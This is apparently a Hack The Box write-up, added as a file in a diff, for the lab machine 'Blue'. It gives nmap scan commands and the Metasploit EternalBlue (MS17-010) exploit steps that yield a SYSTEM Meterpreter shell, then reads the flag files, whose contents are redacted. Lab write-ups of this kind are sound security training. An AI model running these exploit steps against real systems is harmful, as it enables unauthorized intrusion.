@@ -1,0 +1,78 @@
+# 💥 Hack The Box – Blue
+
+**IP:** 10.129.169.27  
+**OS:** Windows  
+**Difficulty:** Easy  
+**Status:** ✅ Rooted
+
+---
+
+## 🛠️ Workspace Setup
+
+```bash
+cd /tmp
+mkdir blue && cd blue
+```
+
+---
+
+## 🔍 Full Port Scan (All 65535 ports + Default Scripts + Service Detection)
+
+```bash
+nmap -sS -sV -sC -p- -T4 -Pn -oN fullscan.txt 10.129.169.27
+```
+
+📌 Result:  
+- Port 445 open (SMB)  
+- OS possibly vulnerable to **MS17-010 (EternalBlue)**
+
+---
+
+## 💣 Exploitation with Metasploit
+
+```bash
+sudo -i
+msfdb start
+msfconsole
+
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+set LHOST tun0
+set RHOSTS 10.129.169.27
+run
+```
+
+📌 Result: Meterpreter shell obtained (`NT AUTHORITY\SYSTEM`)
+
+---
+
+## 📦 Post-Exploitation (Windows Shell)
+
+```cmd
+shell
+cd \
+dir
+
+cd Users
+dir
+
+cd haris\Desktop
+type user.txt   # [REDACTED]
+
+cd \Users\Administrator\Desktop
+type root.txt   # [REDACTED]
+```
+
+---
+
+## 🧾 Notes
+
+- ⚠️ Target was vulnerable to MS17-010
+- 🐚 Shell obtained with full SYSTEM privileges
+- 🧠 No privilege escalation needed — direct root-level access
+- 🔐 Flags removed to comply with Hack The Box rules
+
+---
+
+✅ Tested and documented by Alessio Martinelli  
+📁 Repository: [htb-writeups](https://github.com/<tuo-user>/htb-writeups)
